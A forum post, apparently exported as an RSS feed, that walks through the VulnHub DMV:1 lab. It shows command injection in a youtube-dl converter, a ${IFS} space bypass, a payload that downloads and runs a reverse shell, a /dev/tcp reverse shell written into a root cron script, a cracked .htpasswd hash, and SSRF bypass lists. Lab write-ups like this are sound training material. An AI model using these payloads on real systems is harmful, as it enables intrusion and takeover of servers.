<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>(VulnHub) [DMV: 1] WriteUp — Walkthrough</title>
    <link>https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864</link>
    <description>Original WriteUp:
https://medium.com/p/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9

VulnHub Link: https://www.vulnhub.com/entry/dmv-1,462/

Description:

It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root userThis works better with VirtualBox rather than VMware.

The VirtualBox IP: 192.168.56.101

So as a start and as always a quick nmap scan:

&gt; nmap -sC -sV 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-16 16:25 GMT Daylight Time
Nmap scan report for 192.168.56.101
Host is up (0.00022s latency).
Not shown: 998 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
| 256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_ 256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:28:AD:53 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds

We have only 2 opened ports !

22 (ssh) ==&gt;OpenSSH 7.6p1

80 (http) ==&gt; Apache httpd 2.4.29

and the nmap log show us that we are in a Ubuntu server

Let’s see what we have on port 80 (the web page)

![|1366x647](upload://54eU1JAd3ejVEkaQhEBwjZQEmkN.png)

We have some kind of YouTube to MP3 converter !

let’s try to put something in the video ID and intercept the request using BurpSuite

![|544x426](upload://6JbjLph91aCw5NH7UIAnxpoyCTH.png)

and the sent request from burpsuite:

POST / HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.56.101/
Content-Length: 57
DNT: 1
Connection: close **yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D123456**

and The response was:

HTTP/1.1 200 OK
Date: Thu, 16 Apr 2020 15:28:06 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 392
Connection: close
Content-Type: text/html; charset=UTF-8{&quot;status&quot;:1,&quot;errors&quot;:&quot;WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 123456. URL https:\/\/www.youtube.com\/watch?v= **123456** looks truncated.\n&quot;,&quot;url_orginal&quot;:&quot; **https:\/\/www.youtube.com\/watch?v=123456** &quot;,&quot;output&quot;:&quot;&quot;,&quot;result_url&quot;:&quot;\/tmp\/downloads\/5e9879861935f.mp3&quot;}

So we have a post request that takes the ID we put and add it to “https://www.youtube.com/watch?v&quot;

It looks from the request “yt_url” that we can change the YouTube URL with something else !

before that we have in response somehow an error ! let’s google this and see what we have

![|880x570](upload://t2gNqEdQopSIziYwlx15RnmhD0Y.png)

So the website is using a python tool that allows you to convert and download youtube videos to MP3

and I quote from the [github](https://github.com/ytdl-org/youtube-dl) link

Command-line program to download videos from YouTube.com and other video sites

before then I start anything I had to check the commands list of this program (youtube-dl)


![|812x530](upload://cjtzKcMHc9DXElDEbahbF9KvHRs.png)

So let’s try via BurpSuite repeater to print the version info (“ — version” as shown below)


![|1139x569](upload://vKdgbJKtjyTKTYV0d8VnkAI66Iz.png)

So the version was printed without errors and the program is using the version 2020.03.24 ( not that old )

So from the commits let’s check what we have in this version and specially looking for any bugs !


![|1093x472](upload://n50dsydKlmnmuJ422cKunCbyEsC.png)

And if you want to look for bugs (I mean generally in github) don’t search on commits of the current version but you have to check recent ones …



![|1011x541](upload://k0mtPacsCPbxEBBNO50YoEKzIga.png)

As you notice we have the Mar 23,2020 and the Apr 5, 2020 and more … The last one is on Apr 11, 2020

You can check manually https://github.com/ytdl-org/youtube-dl/commits/master

nothing looks suspicious just some random updates and fixes …

(I hope everything above is clear to now !)

So let’s go back to the command list and see if we can somehow execute commands on system !


![|1366x638](upload://bbhJOn7fuQB1TYgWj0kfrw6CqOk.png)

So let’s go back to our Burpsuite repeater and try this with changing the command to whoami



![|1140x638](upload://aPOdOhHagzNKrVhI7zc6sLketMv.png)

Nothing ! but something isn’t normal if you take a look at the url_original value in the response you won’t see

the ‘whoami’ maybe it’s restricting some commands or maybe it takes only what before the space ? let’s URL Encode that and try (the space in URL Encode is +)

nothing too ! still not showing the whoami let’s write whoami without the — exec and without single quotes


![|1130x148](upload://dxAaLS91kcmWxQCzoVLWvXWb3CM.png)

so the problem isn’t in whoami let’s write it with single quotes


![|1119x105](upload://i2NvI78GpwmzmzdYZOeQhqcAeau.png)

Now am 100% sure that the problem is in spaces cause I tried also to send more than 20 characters here is an example

![|1113x95](upload://5l5z8ChgdhB3aub216Kxqy1OHio.png)

So for a quick and smart scan let’s send this over Intruder using special characters list …

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt

The images below will explain how to use the Intruder in BurpSuite

1. Configure the position of where you want the payloads will be inserted (write anything and select it and click on Add)

![|1138x608](upload://c6ZE9OAGL6tCfN4icLdAKPeYeCq.png)

2. Copy the special characters list and paste it here (The Payload Section)

![|1136x606](upload://6vRu6yZSpjlVB8lKWC6A7ib1KJA.png)

Now Click on Start Attack, To compare between the sent requests we should take a look at length case

![|750x539](upload://6oNt6up2CGDhKThupce5E4sR7NV.png)

As you see many different values let’s eliminate the 564 ones cause they had the same error message which is

{&quot;status&quot;:1,&quot;errors&quot;:&quot;WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u&#39;!&#39; is not a valid URL. Set --default-search \&quot;ytsearch\&quot; (or run youtube-dl \&quot;ytsearch:!\&quot; ) to search YouTube\n&quot;,&quot;url_orginal&quot;:&quot;!&quot;,&quot;output&quot;:&quot;&quot;,&quot;result_url&quot;:&quot;\/tmp\/downloads\/5e9881edeff6e.mp3&quot;}

but the special cases having this

{&quot;status&quot;:2,&quot;errors&quot;:&quot; **sh: 1:** cannot open -f: No such file\n&quot;,&quot;url_orginal&quot;:&quot;&lt;&quot;,&quot;output&quot;:&quot;&quot;,&quot;result_url&quot;:&quot;\/tmp\/downloads\/5e98820f668c1.mp3&quot;}

something is saying “ sh “ :D let’s go back to out Intruder and to the options tab

![|566x649](upload://y89UWe6eDHgAYAWm8PxGPMkFRvG.png)

In the Grep — Match section clear all the values and add sh: 1 or just sh: and go back to the results tab

![|757x240](upload://yEOTRLXCfi4I1KntvIYuyagsojY.png)

No we reduce the results to only 9 characters that bypass the program and lead us to use the sh/bash commands …

In the request we have the backquote or the grave accent

If you don’t know what backquote does read this:

When the old-style backquote form of substitution is used, backslash
retains its literal meaning except when followed by $, `, or \. The
first backquote not preceded by a backslash terminates the command sub‐
stitution. When using the $(command) form, all characters between the
parentheses make up the command; none are treated specially.Command substitutions may be nested. To nest when using the backquoted
form, escape the inner backquotes with backslashes.

So to make things easier for you guys here is our new payload list

&amp;
(
)
|
`
&#39;
&quot;
&lt;
;

Let’s run another intruder but this time let’s include a command with backquote `id`

and the command was executed successfully but isn’t showing all the command return !

So if you go down to the response of the other payloads we only one that print everything

![|827x317](upload://tMPHI0W4Lnwq02J6HP2nbt1kztM.png)

so we are going to use this from :D let’s send that to our repeater and start typing several commands


![|1124x386](upload://s7i6SRHjsWyokkJWU6KacJQczC5.png)

as you see everything works but still something how to bypass the spaces thing !

if we run ls -la and URL Encode this we get an error message


![|1136x266](upload://r9rJ8UdStvgn4HwSgl1vTpFGqGX.png)

So I know a bash trick that allows you to bypass WAF and many other space restrictions

replace space with a special shell variable known as “${IFS}” [The Internal field separator](https://bash.cyberciti.biz/guide/$IFS)

and here is a good List for bypassing I found on google (I didn’t try it but they seems correct)

https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294


![|1139x504](upload://frAhtZ0C6cj0Ki8zFI3HT9ONUFX.png)

So the easiest way to use this and for few spaces we should start the python SimpleHTTPServer and download our shell to this Box and run it

yt_url=%3c`cd${IFS}/var/www/html/images/;wget${IFS}http://192.168.56.1:8080/rev.py;python${IFS}rev.py`

images is a writable folder we can find after using ls -la we have also tmp directory and the main is writable too but this just to check if we can run 3 commands in one line using (;) separator ,so let’s check if our Listener (nc) is UP and execute the command …



![|1344x341](upload://sdwt50TYRW9g4NuzbhBkrivBV47.png)

The response isn’t returning anything which means we are successfully connected to the shell :D

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash

let’s search for the first flag

going to the main directory (/var/www/html/)

![|543x212](upload://j3Wt6hUyK5ql9NKkuRISFZCfLvi.png)

you will find the first flag on the admin directory

cat /var/www/html/admin/flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}

and also .htpasswd file

cat /var/www/html/admin/.htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

If we crack the hash using hashcat we’ll got **jessie**

itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie

maybe this will be useful for the root part …

Let’s go to the ROOT Part ! (is going to be short this time)

I uploaded many tools for enumeration as LinEnum and LinPeas but couldn’t find anything with these

I tried to use the password we found for the user dmv and nothing too !

I asked for a friend who did the box before I download it :p

and he said look in cronjobs but still not finding a thing here !

So I remember that I saw a file in /tmp/ directory named clean.sh with one line

rm -rf downloads

so it clear the bash script delete the folder “downloads” !

So I modified it and put this line

bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1&#39;

and I again run my listener on port 4444


![|711x393](upload://s4TXII6OZNxV6PscQKUJPJ1atpW.png)

and I was lucky we are r00t :D

So another way to get the root is using pspy a processor spy

https://github.com/DominicBreuker/pspy/releases

(All the releases are in the link above for both 32bits and 64bits)

from the command uname -a in your shell you’ll define the system CPU architecture

Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 **x86_64**

let’s upload it to our shell and make it executable (chmod +x pspy64) and execute it


![|981x175](upload://4XKwHCqHG0JuH3wUTyWcZ9P1tjP.png)

So as you see the task is executed each minute with root privileges and our injected reverse shell is still being executed.

I hope everything was clear and excuse my English I’m doing my best here ^_^</description>
    
    <lastBuildDate>Tue, 28 Apr 2020 14:33:45 +0000</lastBuildDate>
    <category>CTF</category>
    <atom:link href="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>(VulnHub) [DMV: 1] WriteUp — Walkthrough</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864/2</link>
        <pubDate>Fri, 28 Aug 2020 06:33:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20864-2</guid>
        <source url="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864.rss">(VulnHub) [DMV: 1] WriteUp — Walkthrough</source>
      </item>
      <item>
        <title>(VulnHub) [DMV: 1] WriteUp — Walkthrough</title>
        <dc:creator><![CDATA[DamaneDz]]></dc:creator>
        <description><![CDATA[
            <p>Original WriteUp:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
      <a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9" target="_blank" rel="noopener nofollow ugc" title="05:10PM - 09 September 2020">Medium – 9 Sep 20</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b26c4d1b44b90d4c0e5b0d56a9485c5b44b53321.png" class="thumbnail" width="" height="">

<h3><a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9" target="_blank" rel="noopener nofollow ugc">(VulnHub) [DMV: 1] WriteUp — Walkthrough</a></h3>

<p>VulnHub Link: https://www.vulnhub.com/entry/dmv-1,462/</p>

  <p><span class="label1">Reading time: 9 min read</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>VulnHub Link: <a href="https://www.vulnhub.com/entry/dmv-1,462/" rel="noopener nofollow ugc">https://www.vulnhub.com/entry/dmv-1,462/</a></p>
<p>Description:</p>
<p>It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root userThis works better with VirtualBox rather than VMware.</p>
<p>The VirtualBox IP: 192.168.56.101</p>
<p>So as a start and as always a quick nmap scan:</p>
<blockquote>
<p>nmap -sC -sV 192.168.56.101<br>
Starting Nmap 7.80 ( <a href="https://nmap.org" rel="noopener nofollow ugc">https://nmap.org</a> ) at 2020-04-16 16:25 GMT Daylight Time<br>
Nmap scan report for 192.168.56.101<br>
Host is up (0.00022s latency).<br>
Not shown: 998 closed ports<br>
PORT STATE SERVICE VERSION<br>
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey:<br>
| 2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)<br>
| 256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)<br>
|_ 256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)<br>
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))<br>
|_http-server-header: Apache/2.4.29 (Ubuntu)<br>
|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>
MAC Address: 08:00:27:28:AD:53 (Oracle VirtualBox virtual NIC)<br>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/" rel="noopener nofollow ugc">https://nmap.org/submit/</a> .<br>
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds</p>
</blockquote>
<p>We have only 2 opened ports !</p>
<p>22 (ssh) ==&gt;OpenSSH 7.6p1</p>
<p>80 (http) ==&gt; Apache httpd 2.4.29</p>
<p>and the nmap log show us that we are in a Ubuntu server</p>
<p>Let’s see what we have on port 80 (the web page)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png" alt="" data-base62-sha1="54eU1JAd3ejVEkaQhEBwjZQEmkN" width="690" height="326"></p>
<p>We have some kind of YouTube to MP3 converter !</p>
<p>let’s try to put something in the video ID and intercept the request using BurpSuite</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2f288cc39874701bcac2e4b79213a8f3876f4025.png" alt="" data-base62-sha1="6JbjLph91aCw5NH7UIAnxpoyCTH" width="544" height="426"></p>
<p>and the sent request from burpsuite:</p>
<p>POST / HTTP/1.1<br>
Host: 192.168.56.101<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0<br>
Accept: <em>/</em><br>
Accept-Language: en-US,en;q=0.5<br>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>
X-Requested-With: XMLHttpRequest<br>
Referer: <a href="http://192.168.56.101/" rel="noopener nofollow ugc">http://192.168.56.101/</a><br>
Content-Length: 57<br>
DNT: 1<br>
Connection: close <strong>yt_url=https%3A%2F%<a href="http://2Fwww.youtube.com" rel="noopener nofollow ugc">2Fwww.youtube.com</a>%2Fwatch%3Fv%3D123456</strong></p>
<p>and The response was:</p>
<p>HTTP/1.1 200 OK<br>
Date: Thu, 16 Apr 2020 15:28:06 GMT<br>
Server: Apache/2.4.29 (Ubuntu)<br>
Vary: Accept-Encoding<br>
Content-Length: 392<br>
Connection: close<br>
Content-Type: text/html; charset=UTF-8{“status”:1,“errors”:“WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 123456. URL <a href="https://www.youtube.com/watch?v=" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=</a> <strong>123456</strong> looks truncated.\n”,“url_orginal”:" <strong><a href="https://www.youtube.com/watch?v=123456" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=123456</a></strong> “,“output”:”",“result_url”:"/tmp/downloads/5e9879861935f.mp3"}</p>
<p>So we have a post request that takes the ID we put and add it to “<a href="https://www.youtube.com/watch?v" rel="noopener nofollow ugc">https://www.youtube.com/watch?v</a>"</p>
<p>It looks from the request “yt_url” that we can change the YouTube URL with something else !</p>
<p>before that we have in response somehow an error ! let’s google this and see what we have</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cb80c301577be89e527c63dc10a714ade0701490.png" alt="" data-base62-sha1="t2gNqEdQopSIziYwlx15RnmhD0Y" width="690" height="446"></p>
<p>So the website is using a python tool that allows you to convert and download youtube videos to MP3</p>
<p>and I quote from the <a href="https://github.com/ytdl-org/youtube-dl" rel="noopener nofollow ugc">github</a> link</p>
<p>Command-line program to download videos from <a href="http://YouTube.com" rel="noopener nofollow ugc">YouTube.com</a> and other video sites</p>
<p>before then I start anything I had to check the commands list of this program (youtube-dl)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/564db84a25105fddde205394f9addb862feb7226.png" alt="" data-base62-sha1="cjtzKcMHc9DXElDEbahbF9KvHRs" width="690" height="450"></p>
<p>So let’s try via BurpSuite repeater to print the version info (“ — version” as shown below)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/de7cbe7373185e26476a5ca5a75021d3039c1b73.png" alt="" data-base62-sha1="vKdgbJKtjyTKTYV0d8VnkAI66Iz" width="690" height="344"></p>
<p>So the version was printed without errors and the program is using the version 2020.03.24 ( not that old )</p>
<p>So from the commits let’s check what we have in this version and specially looking for any bugs !</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a1c2cb47f1df042fb85e65634d8fbf6710bc152e.png" alt="" data-base62-sha1="n50dsydKlmnmuJ422cKunCbyEsC" width="690" height="297"></p>
<p>And if you want to look for bugs (I mean generally in github) don’t search on commits of the current version but you have to check recent ones …</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c35f8eaca1ec6975b17233a8110caa96c01dc62.png" alt="" data-base62-sha1="k0mtPacsCPbxEBBNO50YoEKzIga" width="690" height="369"></p>
<p>As you notice we have the Mar 23,2020 and the Apr 5, 2020 and more … The last one is on Apr 11, 2020</p>
<p>You can check manually <a href="https://github.com/ytdl-org/youtube-dl/commits/master" rel="noopener nofollow ugc">https://github.com/ytdl-org/youtube-dl/commits/master</a></p>
<p>nothing looks suspicious just some random updates and fixes …</p>
<p>(I hope everything above is clear to now !)</p>
<p>So let’s go back to the command list and see if we can somehow execute commands on system !</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e5e83b12cb7565f90745acb3e0a7b22f074df08.png" alt="" data-base62-sha1="bbhJOn7fuQB1TYgWj0kfrw6CqOk" width="690" height="322"></p>
<p>So let’s go back to our Burpsuite repeater and try this with changing the command to whoami</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4bf108a54b8b19ecdbd250eb2269c0622f630623.png" alt="" data-base62-sha1="aPOdOhHagzNKrVhI7zc6sLketMv" width="690" height="386"></p>
<p>Nothing ! but something isn’t normal if you take a look at the url_original value in the response you won’t see</p>
<p>the ‘whoami’ maybe it’s restricting some commands or maybe it takes only what before the space ? let’s URL Encode that and try (the space in URL Encode is +)</p>
<p>nothing too ! still not showing the whoami let’s write whoami without the — exec and without single quotes</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5ee81bf015a78fb1b280defca214bca371b1df18.png" alt="" data-base62-sha1="dxAaLS91kcmWxQCzoVLWvXWb3CM" width="690" height="90"></p>
<p>so the problem isn’t in whoami let’s write it with single quotes</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7e781e098ebd8080e07f920f35c104fa75228d62.png" alt="" data-base62-sha1="i2NvI78GpwmzmzdYZOeQhqcAeau" width="690" height="64"></p>
<p>Now am 100% sure that the problem is in spaces cause I tried also to send more than 20 characters here is an example</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/256d2c150a4255a0948f2beb3588c00a0c3d8660.png" alt="" data-base62-sha1="5l5z8ChgdhB3aub216Kxqy1OHio" width="690" height="58"></p>
<p>So for a quick and smart scan let’s send this over Intruder using special characters list …</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt</a></h4>
<pre><code class="lang-txt">~
!
@
#
$
%
^
&amp;
*
(
)
_
_
+
=
{
}
]
[
|
</code></pre>

  This file has been truncated. <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">show original</a>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>The images below will explain how to use the Intruder in BurpSuite</p>
<ol>
<li>Configure the position of where you want the payloads will be inserted (write anything and select it and click on Add)</li>
</ol>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/54e47dc115adf26fd3662f2f9f5d58c59e679ca6.png" alt="" data-base62-sha1="c6ZE9OAGL6tCfN4icLdAKPeYeCq" width="690" height="368"></p>
<ol start="2">
<li>Copy the special characters list and paste it here (The Payload Section)</li>
</ol>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2da7185298400aee5156d79e20afa0aa745c10ea.png" alt="" data-base62-sha1="6vRu6yZSpjlVB8lKWC6A7ib1KJA" width="690" height="368"></p>
<p>Now Click on Start Attack, To compare between the sent requests we should take a look at length case</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2cdaa7077bd2bd5680d74cac7b0a69cfca2cf54b.png" alt="" data-base62-sha1="6oNt6up2CGDhKThupce5E4sR7NV" width="690" height="495"></p>
<p>As you see many different values let’s eliminate the 564 ones cause they had the same error message which is</p>
<p>{“status”:1,“errors”:“WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u’!’ is not a valid URL. Set --default-search “ytsearch” (or run youtube-dl “ytsearch:!” ) to search YouTube\n”,“url_orginal”:"!",“output”:"",“result_url”:"/tmp/downloads/5e9881edeff6e.mp3"}</p>
<p>but the special cases having this</p>
<p>{“status”:2,“errors”:" <strong>sh: 1:</strong> cannot open -f: No such file\n",“url_orginal”:"&lt;",“output”:"",“result_url”:"/tmp/downloads/5e98820f668c1.mp3"}</p>
<p>something is saying “ sh “ <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> let’s go back to out Intruder and to the options tab</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ef360cf5f26b878356d582a3014eebe8cef82b38.png" alt="" data-base62-sha1="y89UWe6eDHgAYAWm8PxGPMkFRvG" width="436" height="500"></p>
<p>In the Grep — Match section clear all the values and add sh: 1 or just sh: and go back to the results tab</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f2e7345673d161d9bed8dd499adec92f0ce2a996.png" alt="" data-base62-sha1="yEOTRLXCfi4I1KntvIYuyagsojY" width="690" height="218"></p>
<p>No we reduce the results to only 9 characters that bypass the program and lead us to use the sh/bash commands …</p>
<p>In the request we have the backquote or the grave accent</p>
<p>If you don’t know what backquote does read this:</p>
<p>When the old-style backquote form of substitution is used, backslash<br>
retains its literal meaning except when followed by $, `, or . The<br>
first backquote not preceded by a backslash terminates the command sub‐<br>
stitution. When using the $(command) form, all characters between the<br>
parentheses make up the command; none are treated specially.Command substitutions may be nested. To nest when using the backquoted<br>
form, escape the inner backquotes with backslashes.</p>
<p>So to make things easier for you guys here is our new payload list</p>
<p>&amp;<br>
(<br>
)<br>
|<br>
`<br>
’<br>
"<br>
&lt;<br>
;</p>
<p>Let’s run another intruder but this time let’s include a command with backquote <code>id</code></p>
<p>and the command was executed successfully but isn’t showing all the command return !</p>
<p>So if you go down to the response of the other payloads we only one that print everything</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d0c4375514562b6d339089ebb3ef1061fae3e7d2.png" alt="" data-base62-sha1="tMPHI0W4Lnwq02J6HP2nbt1kztM" width="690" height="264"></p>
<p>so we are going to use this from <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> let’s send that to our repeater and start typing several commands</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c50fe4762122dfa68889dfaf344d947c0edabc05.png" alt="" data-base62-sha1="s7i6SRHjsWyokkJWU6KacJQczC5" width="690" height="236"></p>
<p>as you see everything works but still something how to bypass the spaces thing !</p>
<p>if we run ls -la and URL Encode this we get an error message</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/be4c15725761627ddaf8fdece014a1e79aa47e2f.png" alt="" data-base62-sha1="r9rJ8UdStvgn4HwSgl1vTpFGqGX" width="690" height="161"></p>
<p>So I know a bash trick that allows you to bypass WAF and many other space restrictions</p>
<p>replace space with a special shell variable known as “${IFS}” <a href="https://bash.cyberciti.biz/guide/%24IFS" rel="noopener nofollow ugc">The Internal field separator</a></p>
<p>and here is a good List for bypassing I found on google (I didn’t try it but they seems correct)</p>
<aside class="onebox githubgist">
  <header class="source">
      <a href="https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">gist.github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294</a></h4>
<h5>bypasses.txt</h5>
<pre><code class="Text"># SSRF localhost (@omespino)

http://127.0.0.1
http://[::]/                # ipv6
http://0/  
http://localtest.me         # dns to 127.0.0.1
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0x7f.0x00.0x00.0x01  # hex
http://0177.0.0.01          # octal</code></pre>
This file has been truncated. <a href="https://gist.github.com/bayotop/6072e9c87632e5f75dd42483b0076294" target="_blank" rel="noopener nofollow ugc">show original</a>

<p>
</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

